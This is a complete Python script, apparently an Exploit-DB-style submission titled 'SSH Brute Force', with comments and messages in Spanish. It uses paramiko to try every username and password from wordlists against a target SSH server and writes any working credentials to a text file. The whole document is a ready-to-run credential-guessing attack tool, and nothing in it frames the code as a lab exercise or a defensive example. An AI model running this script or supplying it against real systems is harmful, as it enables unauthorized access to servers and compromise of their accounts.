# Exploit Title: SSH Brute Force
# Date: 18/04/2024
# Exploit Author: JHacKL

#!/bin/python3

import paramiko
import argparse
import os

class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

save_file = "success_login_credentials.txt"
valid_credentials = []

# Función de lectura en archivos
def read_file(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file]

# Función de escritura en archivos
def write_to_file(file_path, data):
    with open(file_path, "w") as file:
        for line in data:
            file.write(line + "\n")

def ssh_connect(host, username, password, port=22):
    global valid_credentials
    # Inicializar el cliente SSH
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Intentar conectar al servidor SSH
        client.connect(host, port=port, username=username, password=password)
        print(bcolors.OKGREEN + "[+]" + bcolors.ENDC + " Conexión SSH establecida a " + str(host) +" como " + username + " con contraseña " + password + "")
        valid_credentials.append(username + ' / ' + password)
        return True
    except paramiko.AuthenticationException:
        print(bcolors.FAIL + "[-]" + bcolors.ENDC + " No se pudo conectar a " + str(host) +" como " + username + " con contraseña " + password + "")
        return False
    except Exception as e:
        print(bcolors.FAIL + "[!]" + bcolors.ENDC + " Error al conectar a " + str(host) + ": " + str(e) + "")
        return False
    finally:
        # Cerrar la conexión
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Script para probar la conexión SSH")
    parser.add_argument("host", help="Dirección IP o nombre de dominio del servidor SSH")
    parser.add_argument("username", nargs="?", help="Nombre de usuario o archivo de texto con los nombres de usuario a utilizar")
    parser.add_argument("password", nargs="?", help="Contraseña o archivo de texto con las contraseñas a utilizar")
    parser.add_argument("--port", type=int, default=22, help="Puerto SSH (por defecto: 22)")

    args = parser.parse_args()

    host = args.host
    username_arg = args.username
    password_arg = args.password
    port = args.port

    # Determinar si se proporcionó un archivo o un nombre de usuario directo
    if os.path.isfile(username_arg):
        usernames = read_file(username_arg)
    else:
        usernames = [username_arg]

    # Determinar si se proporcionó un archivo o una contraseña directa
    if os.path.isfile(password_arg):
        passwords = read_file(password_arg)
    else:
        passwords = [password_arg]

    # Probar todas las combinaciones de nombres de usuario y contraseñas
    for username in usernames:
        for password in passwords:
            if(ssh_connect(host, username, password, port)):
                break
    
    global save_file
    global valid_credentials
    if len(valid_credentials) != 0:
        print(bcolors.OKBLUE + "[!]" + bcolors.ENDC + " Guardando resultados en " + save_file)
        write_to_file(save_file, valid_credentials)
    print(bcolors.OKGREEN + "[!] FINISHED [!]" +bcolors.ENDC)

if __name__ == "__main__":
    main()
